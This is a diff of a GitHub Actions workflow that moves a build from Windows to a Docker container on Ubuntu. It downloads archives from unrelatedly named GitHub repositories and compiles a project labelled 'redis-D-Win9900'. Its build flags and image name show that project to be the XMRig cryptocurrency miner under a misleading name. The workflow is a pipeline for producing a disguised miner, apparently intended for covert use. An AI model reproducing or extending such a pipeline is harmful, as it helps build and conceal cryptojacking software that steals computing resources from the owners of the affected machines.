@@ -8,53 +8,70 @@ on:
 
 jobs:
   build:
-    runs-on: windows-latest
+    runs-on: ubuntu-latest
 
     steps:
       - name: Checkout source code
         uses: actions/checkout@v3
 
-      # Install Visual Studio tools instead of MSYS2 to support MASM
-      - name: Setup Visual Studio Developer Command Prompt
-        uses: ilammy/msvc-dev-cmd@v1
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v2
 
-      # Download required dependencies
-      - name: Download dependencies
+      - name: Create Dockerfile
         run: |
-          curl -L -o gcc.zip https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip
-          curl -L -o redis.zip https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win9900.zip
-          
-      # Unzip dependencies
-      - name: Unzip dependencies
+          cat > Dockerfile << 'EOF'
+          FROM ubuntu:22.04
+
+          # Avoid interactive prompts during package installation
+          ENV DEBIAN_FRONTEND=noninteractive
+
+          # Install build dependencies
+          RUN apt-get update && apt-get install -y \
+              build-essential \
+              cmake \
+              git \
+              curl \
+              wget \
+              nasm \
+              unzip \
+              libssl-dev \
+              libhwloc-dev \
+              libuv1-dev \
+              && rm -rf /var/lib/apt/lists/*
+
+          # Set up working directory
+          WORKDIR /app
+
+          # Copy project files
+          COPY . .
+
+          # Download dependencies
+          RUN mkdir -p /app/deps && \
+              cd /app/deps && \
+              wget -O gcc.zip https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip && \
+              wget -O redis.zip https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win9900.zip && \
+              unzip -o gcc.zip && \
+              unzip -o redis.zip
+
+          # Setup build process
+          RUN mkdir -p /app/deps/redis-D-Win9900/build
+
+          # Build command will be run separately
+          CMD cd /app/deps/redis-D-Win9900/build && \
+              cmake .. -DXMRIG_DEPS=/app/deps/gcc/gcc/x64 -DBUILD_SHARED_LIBS=OFF && \
+              cmake --build . --config Release
+          EOF
+
+      - name: Build Docker image
+        run: docker build -t xmrig-builder .
+
+      - name: Run build in Docker container
         run: |
-          powershell -Command "Expand-Archive -Path gcc.zip -DestinationPath gcc"
-          powershell -Command "Expand-Archive -Path redis.zip -DestinationPath redis"
+          docker run --name xmrig-build xmrig-builder
+          docker cp xmrig-build:/app/deps/redis-D-Win9900/build/Release ./Release
 
-      # Create build directory
-      - name: Create build directory
-        run: mkdir -p redis/redis-D-Win9900/build
-
-      # Install CMake
-      - name: Setup CMake
-        uses: jwlawson/actions-setup-cmake@v1.13
-        with:
-          cmake-version: '3.20.x'
-
-      # Run CMake to generate Visual Studio project files - using VS 2022 instead of VS 2019
-      - name: Run CMake to generate VS project files
-        run: |
-          cd redis/redis-D-Win9900/build
-          cmake .. -G "Visual Studio 17 2022" -A x64 -DXMRIG_DEPS=${{ github.workspace }}/gcc/gcc/x64 -DBUILD_SHARED_LIBS=OFF
-
-      # Build using Visual Studio's MSBuild
-      - name: Build project
-        run: |
-          cd redis/redis-D-Win9900/build
-          cmake --build . --config Release
-
-      # Archive the build artifacts
       - name: Archive build artifacts
         uses: actions/upload-artifact@v4
         with:
           name: build-artifacts
-          path: redis/redis-D-Win9900/build/Release
+          path: ./Release
